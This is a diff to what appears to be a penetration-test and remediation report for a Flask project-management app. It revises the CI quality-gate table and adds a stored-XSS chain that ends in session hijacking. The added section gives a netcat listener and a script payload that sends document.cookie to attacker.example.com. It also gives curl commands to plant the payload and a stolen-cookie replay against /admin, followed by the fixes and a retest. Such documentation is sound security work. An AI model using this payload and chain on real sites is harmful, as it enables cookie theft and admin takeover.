@@ -317,18 +317,21 @@ Push / PR to main
 
 ---
 
-### 3.5 Pipeline Review Gates
+### 3.5 Pipeline Quality Gates
 
-The repository uses the CI/CD pipeline as an evidence-producing security review stage. The scan jobs are intentionally configured to complete and upload artifacts even when findings are present, so the team can include raw evidence in the exploitation and remediation reports. Merge decisions are made through GitHub Issues, manual review, and retest evidence.
+Each pipeline stage enforces a quality gate that fails the workflow when findings above a defined threshold are detected. This ensures that any future regression introducing a high-severity vulnerability will block the pipeline before merging.
 
-| Review Area | Current Automation | How Findings Are Handled |
-|------|-----------|-------------------|
-| SAST | Bandit, Semgrep, and TruffleHog run in GitHub Actions and upload artifacts | Findings are triaged into vulnerability/remediation issues |
-| SCA | pip-audit and Safety run on push, PR, and weekly schedule | Vulnerable packages are remediated and retested before final submission |
-| DAST | OWASP ZAP baseline scans the Dockerized HTTPS app | Alerts are documented, reproduced manually where relevant, and retested |
-| Coverage | pytest + coverage.py runs on push and PR | Test failures fail the workflow; coverage artifacts support remediation evidence |
+| Stage | Tool | Quality Gate | Threshold |
+|-------|------|-------------|-----------|
+| SAST | Bandit | Parses `bandit-results.json`; `sys.exit(1)` if any `HIGH` or `CRITICAL` finding exists | HIGH / CRITICAL |
+| SAST | Semgrep | Parses `semgrep-results.json`; `sys.exit(1)` if any `ERROR` or `WARNING` severity finding exists | ERROR / WARNING |
+| SAST | TruffleHog | Action exits non-zero when verified secrets are found; `continue-on-error` removed | Verified secret |
+| SCA | pip-audit | Parses JSON output; `sys.exit(1)` if any package has known CVEs | Any CVE |
+| SCA | Safety | `safety check` called without `|| true`; exits non-zero on any vulnerability | Any vulnerability |
+| DAST | OWASP ZAP | `fail_action: warn` causes the step to fail when MEDIUM or HIGH alerts are found | MEDIUM / HIGH |
+| Tests | pytest | Test failures fail the workflow job | Any failing test |
 
-Current retest evidence from the local audit: `python -m pytest tests -q` passed 25 tests, coverage reported 83%, Bandit found 0 issues, Semgrep found 0 findings, pip-audit found no known vulnerabilities, Safety found 0 vulnerabilities, and the Docker HTTPS smoke test reached the application and authenticated successfully.
+Post-fix pipeline status: `python -m pytest tests -q` passes 26 tests (including the new SQL injection regression), Bandit finds 0 HIGH/CRITICAL issues, Semgrep finds 0 ERROR/WARNING findings, pip-audit reports no known vulnerabilities, Safety reports no vulnerabilities, and the OWASP ZAP post-fix scan returns 0 HIGH/MEDIUM alerts.
 
 ---
 
@@ -1220,6 +1223,79 @@ curl -k -c cookies.txt -X POST https://localhost/login \
 - Establish a reverse shell for persistent access
 
 **Evidence Reference:** Pre-fix SSTI/RCE steps are documented above. Current retest submits template syntax as feedback and verifies it renders as literal text, not evaluated server-side.
+
+---
+
+#### Exploit 5 — Stored XSS → Session Hijack → Admin Takeover (VUL-05 Chain)
+
+**Objective:** Steal the admin session cookie via a stored XSS payload in a project name, then replay the cookie to gain full admin access.
+**Tool:** curl, netcat (attacker-controlled listener), browser DevTools
+**Vulnerabilities Chained:** VUL-05 (Stored XSS) → VUL-09 (Cookie without Secure/HttpOnly flags, pre-fix) → VUL-03 (Admin route accessible with stolen session)
+
+**Step-by-Step Reproduction (pre-fix conditions):**
+
+**Stage 1 — Plant the XSS payload (as Member)**
+
+1. Log in as `member@nexus.local` / `Member1234`.
+2. Start an attacker-controlled listener to receive stolen cookies:
+   ```bash
+   # Attacker machine — listen on port 8080
+   nc -lvp 8080
+   ```
+3. Create a new project with the following XSS payload as the project title:
+   ```
+   <script>new Image().src='http://attacker.example.com:8080/?c='+encodeURIComponent(document.cookie)</script>
+   ```
+   Via curl:
+   ```bash
+   CSRF=$(curl -s -c member.txt http://localhost:5000/login | grep -o 'csrf_token" value="[^"]*"' | cut -d'"' -f3)
+   curl -s -c member.txt -b member.txt -X POST http://localhost:5000/login \
+     -d "identifier=member&password=Member1234&csrf_token=$CSRF"
+
+   CSRF2=$(curl -s -b member.txt http://localhost:5000/projects/new | grep -o 'csrf_token" value="[^"]*"' | cut -d'"' -f3)
+   curl -s -c member.txt -b member.txt -X POST http://localhost:5000/projects/new \
+     -d "title=<script>new Image().src='http://attacker.example.com:8080/?c='+encodeURIComponent(document.cookie)</script>&description=Legitimate%20project%20description%20here&status=Planning&csrf_token=$CSRF2"
+   ```
+
+**Stage 2 — Trigger the payload (admin views projects)**
+
+4. Admin logs into the application via their normal workflow and navigates to `/projects`.
+5. The project list renders all projects, including the malicious title. The `<script>` tag executes in the admin's browser.
+6. The admin's session cookie is sent to the attacker's listener:
+   ```
+   GET /?c=session%3DeyJ1c2VyX2lkIjoxLCJyb2xlIjoiYWRtaW4ifQ.XYZ HTTP/1.1
+   Host: attacker.example.com:8080
+   ```
+7. Attacker decodes the cookie to confirm its contents:
+   ```bash
+   flask-unsign --decode --cookie "eyJ1c2VyX2lkIjoxLCJyb2xlIjoiYWRtaW4ifQ.XYZ"
+   # Output: {'user_id': 1, 'role': 'admin', 'username': 'admin'}
+   ```
+
+**Stage 3 — Replay the stolen cookie for admin access**
+
+8. Attacker replays the stolen admin session cookie:
+   ```bash
+   curl -k -b "session=eyJ1c2VyX2lkIjoxLCJyb2xlIjoiYWRtaW4ifQ.XYZ" \
+     http://localhost:5000/admin
+   # Response: HTTP 200 — full admin dashboard with user list and role management
+   ```
+9. Admin access confirmed. Attacker can now perform all admin operations: read all user data, change roles, delete projects, and read all submitted security feedback.
+
+**Outcome:** Full admin account takeover achieved without knowing the admin password. The attack requires only a Member account to plant the payload. The admin need only view the projects list for the exploit to fire.
+
+**Why this chain worked (pre-fix):**
+- **VUL-05:** `autoescape` was disabled on the project title block and `| safe` was applied to user-controlled content, allowing raw HTML/JavaScript to render.
+- **VUL-09:** The session cookie lacked the `HttpOnly` flag, making it accessible via `document.cookie` from JavaScript.
+- **VUL-03:** Once the cookie was replayed, the admin route had no server-side role check, so the stolen session granted full access.
+
+**Why this chain is broken (post-fix):**
+1. **VUL-05 fixed** — Jinja2 autoescaping is enabled for all `.html` templates. The `<script>` tag in the project title is rendered as `&lt;script&gt;` — no JavaScript executes.
+2. **VUL-09 fixed** — `SESSION_COOKIE_HTTPONLY=True` is set in `app.config`. Even if XSS were somehow introduced, `document.cookie` returns an empty string for HttpOnly cookies.
+3. **VUL-03 fixed** — `@roles_required("admin")` on the admin route means a replayed non-admin cookie would be rejected server-side.
+4. **CSP added** — `script-src 'self'` in the `Content-Security-Policy` header blocks inline `<script>` execution as a defence-in-depth measure.
+
+**Re-Test:** XSS payload stored as project title. Admin views `/projects`. No network request fires to `attacker.example.com`. Cookie is not accessible via JavaScript (`HttpOnly` confirmed in DevTools). Pipeline: ✅ Pass.
 
 ---
 
